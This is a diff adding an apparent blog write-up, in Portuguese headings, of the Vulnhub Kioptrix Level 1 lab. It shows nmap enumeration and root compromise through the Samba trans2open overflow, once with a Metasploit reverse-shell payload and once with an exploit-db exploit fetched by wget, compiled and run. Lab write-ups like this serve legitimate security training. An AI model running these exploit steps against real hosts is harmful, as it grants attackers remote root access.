@@ -1,0 +1,246 @@
+<html lang="pt-BR">
+<head>
+  <title>Vulnhub - Kioptrix: Level 1 - Anderson Gomes</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+  <script src="/assets/js/shuffle-text.js"></script>
+</head>
+
+<body>
+  <div class="fixed-top">
+    <nav class="navbar navbar-expand-lg d-none d-lg-block d-xl-block nav1" style="height:40px;border-bottom: #7e099f !important; background: #FFFFFF;">
+      <div class="container">
+        <ul class="navbar-nav">
+          <li class="nav-item">
+            <a class="nav-link" href="#">
+              <i class="fa fa-facebook-official fa-2x font_color_primary"></i>
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">
+              <i class="fa fa-linkedin fa-2x font_color_primary"></i>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </nav>
+    <nav class="navbar navbar-expand-lg navbar-light background_color_primary nav2">
+      <div class="container">
+        <a class="navbar-brand suffletext" data-text="Anderson Gomes" href="/">Anderson Gomes</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav mr-auto">
+            <li class="nav-item">
+              <a class="nav-link suffletext" data-text="Writeups" href="/writeups">Writeups</a>
+            </li>
+            <!--li class="nav-item dropdown">
+              <a data-text="Guia de Estudos" class="nav-link dropdown-toggle suffletext" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Guia de Estudos
+              </a>
+              <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+                <a data-text="Forense" class="dropdown-item suffletext" href="forense">Forense</a>
+                <a data-text="Criptografia" class="dropdown-item suffletext" href="criptografia">Criptografia</a>
+                <a data-text="Exploração na Web" class="dropdown-item suffletext" href="web">Exploração na Web</a>
+                <a data-text="Engenharia reversa" class="dropdown-item suffletext" href="eng-reversa">Engenharia reversa</a>
+                <a data-text="Exploração Binária" class="dropdown-item suffletext" href="exp-binaria">Exploração Binária</a>
+              </div>
+            </li-->
+          </ul>
+        </div>
+      </div>
+    </nav>
+  </div>
+  <div class="container-fluid" style="margin-top:100px;min-height: 700px;">
+      <div class="container" id="content">
+          <div class="posts">
+        <h1>Vulnhub - Kioptrix: Level 1</h1>
+        <h3 id="enumeração-de-serviços">Enumeração de Serviços</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/home/kali# nmap <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.104
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-02-06 20:02 EST
+Nmap scan report <span class="k">for </span>192.168.1.104
+Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 994 closed ports
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 <span class="o">(</span>protocol 1.99<span class="o">)</span>
+80/tcp    open  http        Apache httpd 1.3.20 <span class="o">((</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b<span class="o">)</span>
+111/tcp   open  rpcbind     2 <span class="o">(</span>RPC <span class="c">#100000)</span>
+139/tcp   open  netbios-ssn Samba smbd <span class="o">(</span>workgroup: MYGROUP<span class="o">)</span>
+443/tcp   open  ssl/https   Apache/1.3.20 <span class="o">(</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b
+32768/tcp open  status      1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+MAC Address: 08:00:27:8B:9B:63 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 <span class="o">(</span>likely embedded<span class="o">)</span>
+Network Distance: 1 hop
+</code></pre></div></div>
+<h3 id="busca-de-vulnerabilidades">Busca de Vulnerabilidades</h3>
+<p>Buffer overflow Samba 2.2.x CVE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2003-0201" target="_blank">2003-0201</a></p>
+
+<h3 id="exploração">Exploração</h3>
+
+<h4 id="1-usando-metasploit">1. Usando Metasploit.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf <span class="o">&gt;</span> use linux/samba/trans2open
+msf exploit<span class="o">(</span>linux/samba/trans2open<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload generic/shell_reverse_tcp
+payload <span class="o">=&gt;</span> generic/shell_reverse_tcp
+msf exploit<span class="o">(</span>linux/samba/trans2open<span class="o">)</span> <span class="o">&gt;</span> show options 
+
+Module options <span class="o">(</span>exploit/linux/samba/trans2open<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOST                   <span class="nb">yes       </span>The target address
+   RPORT  139              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+
+
+Payload options <span class="o">(</span>generic/shell_reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST                   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Samba 2.2.x - Bruteforce
+
+
+msf exploit<span class="o">(</span>linux/samba/trans2open<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOST 192.168.1.104
+RHOST <span class="o">=&gt;</span> 192.168.1.104
+msf exploit<span class="o">(</span>linux/samba/trans2open<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST  192.168.1.8
+LHOST <span class="o">=&gt;</span> 192.168.1.8
+msf exploit<span class="o">(</span>linux/samba/trans2open<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.1.8:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.104:139 - Trying <span class="k">return </span>address 0xbffffdfc...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.104:139 - Trying <span class="k">return </span>address 0xbffffcfc...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.104:139 - Trying <span class="k">return </span>address 0xbffffbfc...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.104:139 - Trying <span class="k">return </span>address 0xbffffafc...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.8:4444 -&gt; 192.168.1.104:32770<span class="o">)</span> at 2019-02-07 18:28:27 <span class="nt">-0500</span>
+
+/bin/sh <span class="nt">-i</span>
+sh: no job control <span class="k">in </span>this shell
+sh-2.05# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>
+sh-2.05# <span class="nb">cd</span> /var/spool/mail
+<span class="nb">cd</span> /var/spool/mail
+sh-2.05# <span class="nb">ls</span> <span class="nt">-lath</span>
+<span class="nb">ls</span> <span class="nt">-lath</span>
+total 5.0k
+drwxrwxr-x    2 root     mail         1.0k Feb  7 21:57 <span class="nb">.</span>
+<span class="nt">-rw-------</span>    1 root     root         2.6k Feb  7 21:57 root
+<span class="nt">-rw-rw----</span>    1 harold   harold          0 Sep 26  2009 harold
+<span class="nt">-rw-rw----</span>    1 john     john            0 Sep 26  2009 john
+drwxr-xr-x   14 root     root         1.0k Sep 26  2009 ..
+<span class="nt">-rw-rw----</span>    1 nfsnobod nfsnobod        0 Sep 26  2009 nfsnobody
+sh-2.05# <span class="nb">cat </span>root
+<span class="nb">cat </span>root
+From root  Sat Sep 26 11:42:10 2009
+Return-Path: &lt;root@kioptix.level1&gt;
+Received: <span class="o">(</span>from root@localhost<span class="o">)</span>
+	by kioptix.level1 <span class="o">(</span>8.11.6/8.11.6<span class="o">)</span> <span class="nb">id </span>n8QFgAZ01831
+	<span class="k">for </span>root@kioptix.level1<span class="p">;</span> Sat, 26 Sep 2009 11:42:10 <span class="nt">-0400</span>
+Date: Sat, 26 Sep 2009 11:42:10 <span class="nt">-0400</span>
+From: root &lt;root@kioptix.level1&gt;
+Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;
+To: root@kioptix.level1
+Subject: About Level 2
+Status: O
+
+If you are reading this, you got root. Congratulations.
+Level 2 won<span class="s1">'t be as easy...
+
+
+</span></code></pre></div></div>
+
+<h4 id="2-usando-um-exploit-do-exploit-db">2. Usando um exploit do exploit-db.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/home/kali/# wget https://www.exploit-db.com/raw/10 <span class="nt">-O</span> exploit.c
+<span class="nt">--2019-02-07</span> 19:41:33--  https://www.exploit-db.com/raw/10
+Resolving www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>... 192.124.249.8
+Connecting to www.exploit-db.com <span class="o">(</span>www.exploit-db.com<span class="o">)</span>|192.124.249.8|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified <span class="o">[</span>text/plain]
+Saving to: ‘exploit.c’
+
+exploit.c                       <span class="o">[</span>  &lt;<span class="o">=&gt;</span>                                      <span class="o">]</span>  44.06K   154KB/s    <span class="k">in </span>0.3s    
+
+2019-02-07 19:41:34 <span class="o">(</span>154 KB/s<span class="o">)</span> - ‘exploit.c’ saved <span class="o">[</span>45115]
+
+root@kali:/home/kali/# make exploit
+cc     exploit.c   <span class="nt">-o</span> exploit
+root@kali:/home/kali/# ./exploit <span class="nt">-v</span> <span class="nt">-b</span> 0 192.168.1.104
+samba-2.2.8 &lt; remote root exploit by eSDee <span class="o">(</span>www.netric.org|be<span class="o">)</span>
+<span class="nt">--------------------------------------------------------------</span>
++ Verbose mode.
++ Bruteforce mode. <span class="o">(</span>Linux<span class="o">)</span>
++ Host is running samba.
++ Using ret: <span class="o">[</span>0xbffffed4]
++ Using ret: <span class="o">[</span>0xbffffda8]
++ Worked!
+<span class="nt">--------------------------------------------------------------</span>
+<span class="k">***</span> JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 <span class="c">#1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>
+/bin/sh <span class="nt">-i</span>
+sh: no job control <span class="k">in </span>this shell
+sh-2.05# <span class="nb">cd</span> /var/spool/mail
+<span class="nb">cd</span> /var/spool/mail
+sh-2.05# <span class="nb">ls</span> <span class="nt">-lath</span>
+<span class="nb">ls</span> <span class="nt">-lath</span>
+total 5.0k
+drwxrwxr-x    2 root     mail         1.0k Feb  7 21:57 <span class="nb">.</span>
+<span class="nt">-rw-------</span>    1 root     root         2.6k Feb  7 21:57 root
+<span class="nt">-rw-rw----</span>    1 harold   harold          0 Sep 26  2009 harold
+<span class="nt">-rw-rw----</span>    1 john     john            0 Sep 26  2009 john
+drwxr-xr-x   14 root     root         1.0k Sep 26  2009 ..
+<span class="nt">-rw-rw----</span>    1 nfsnobod nfsnobod        0 Sep 26  2009 nfsnobody
+sh-2.05# <span class="nb">cat </span>root
+<span class="nb">cat </span>root
+From root  Sat Sep 26 11:42:10 2009
+Return-Path: &lt;root@kioptix.level1&gt;
+Received: <span class="o">(</span>from root@localhost<span class="o">)</span>
+	by kioptix.level1 <span class="o">(</span>8.11.6/8.11.6<span class="o">)</span> <span class="nb">id </span>n8QFgAZ01831
+	<span class="k">for </span>root@kioptix.level1<span class="p">;</span> Sat, 26 Sep 2009 11:42:10 <span class="nt">-0400</span>
+Date: Sat, 26 Sep 2009 11:42:10 <span class="nt">-0400</span>
+From: root &lt;root@kioptix.level1&gt;
+Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;
+To: root@kioptix.level1
+Subject: About Level 2
+Status: O
+
+If you are reading this, you got root. Congratulations.
+Level 2 won<span class="s1">'t be as easy...
+</span></code></pre></div></div>
+
+</div>
+
+      </div>
+  </div>
+  <div class="py-3">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12 text-center">
+        <p class="mb-0 suffletext">© 2019-2020 Anderson Gomes</p>
+      </div>
+    </div>
+  </div>
+</div>
+<script src="/assets/js/main.js"></script>
+</body>
+</html>
